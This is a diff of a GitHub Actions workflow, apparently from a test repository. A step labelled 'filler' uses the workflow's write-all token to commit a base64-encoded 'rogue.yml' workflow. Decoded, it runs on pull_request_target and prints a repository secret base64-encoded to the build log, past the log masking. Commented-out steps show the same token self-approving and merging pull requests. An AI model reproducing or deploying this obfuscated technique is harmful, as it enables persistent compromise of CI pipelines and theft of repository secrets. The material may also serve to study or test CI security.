@@ -3,6 +3,7 @@ on:
     branches:
       - test-semgrep
   pull_request:
+
 permissions: write-all
 jobs:
   test-auto-approve:
@@ -11,19 +12,24 @@ jobs:
     steps:
       - name: filler
         run: echo "this is test auto approve"
-      
-      # - name: create PR
-      #   run: | 
-      #     curl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/coriky/test-actions/pulls -d "{\"title\":\"New PR\", \"body\":\"New PR Body\", \"head\": \"test-actions:test-semgrep\", \"base\":\"master\"}" 
-          
-      - name: approve review
-        run: | 
+
+      - name: add new workflow filler
+        run: |
           curl \
-          -X POST \
-          -H "Accept: application/vnd.github+json"  \
-          -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-          https://api.github.com/repos/coriky/test-actions/pulls/${{ github.event.number }}/reviews \
-          -d '{"event": "APPROVE"}'
+            -X PUT \
+            -H "Accept: application/vnd.github+json" \ 
+            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/coriky/test-action/contents/.github/workflows/rogue.yml" \
+            -d '{"message":"my commit message","committer":{"name":"Sandro Lex","email":"sandrolex@gmail.com"},"content":"bmFtZTogSGVsbG8gV29ybGQgQWN0aW9uCm9uOiBbcHVsbF9yZXF1ZXN0X3RhcmdldF0KcGVybWlzc2lvbnM6CiAgICAgIGlkLXRva2VuOiB3cml0ZQogICAgICBjb250ZW50czogcmVhZCAKCmpvYnM6CiAgVEVTVF9QUl9UQVJHRVQ6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CiAgICBzdGVwczoKICAgICAgLSBydW46IGVjaG8gJHt7IHNlY3JldHMuRFVNTVkgfX0gfCBiYXNlNjQgPiAvdG1wL291dC50eHQKICAgICAgLSBydW46IGNhdCAvdG1wL291dC50eHQKICAgICAgLSBydW46IGVjaG8gImVuZCIKICAgICAgLSBydW46IGVjaG8gImZyb20gUk9HVUUhISEhIgoK"}'
+
+      # - name: approve review
+      #   run: | 
+      #     curl \
+      #     -X POST \
+      #     -H "Accept: application/vnd.github+json"  \
+      #     -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+      #     https://api.github.com/repos/coriky/test-actions/pulls/${{ github.event.number }}/reviews \
+      #     -d '{"event": "APPROVE"}'
       
       # - name: merge PR
       #   run: |
@@ -32,12 +38,3 @@ jobs:
       #       -H "Accept: application/vnd.github+json"  \
       #       -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
       #       https://api.github.com/repos/coriky/test-actions/pulls/${{ github.event.number }}/merge 
-
-      - name: add new workflow filler
-        run: |
-          curl \
-            -X PUT \
-            -H "Accept: application/vnd.github+json" \ 
-            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-            https://api.github.com/repos/coriky/test-action/contents/.github/workflows/rogue.yml \
-            -d '{"message":"my commit message","committer":{"name":"Sandro Lex","email":"sandrolex@gmail.com"},"content":"bmFtZTogSGVsbG8gV29ybGQgQWN0aW9uCm9uOiBbcHVsbF9yZXF1ZXN0X3RhcmdldF0KcGVybWlzc2lvbnM6CiAgICAgIGlkLXRva2VuOiB3cml0ZQogICAgICBjb250ZW50czogcmVhZCAKCmpvYnM6CiAgVEVTVF9QUl9UQVJHRVQ6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CiAgICBzdGVwczoKICAgICAgLSBydW46IGVjaG8gJHt7IHNlY3JldHMuRFVNTVkgfX0gfCBiYXNlNjQgPiAvdG1wL291dC50eHQKICAgICAgLSBydW46IGNhdCAvdG1wL291dC50eHQKICAgICAgLSBydW46IGVjaG8gImVuZCIKICAgICAgLSBydW46IGVjaG8gImZyb20gUk9HVUUhISEhIgoK"}'
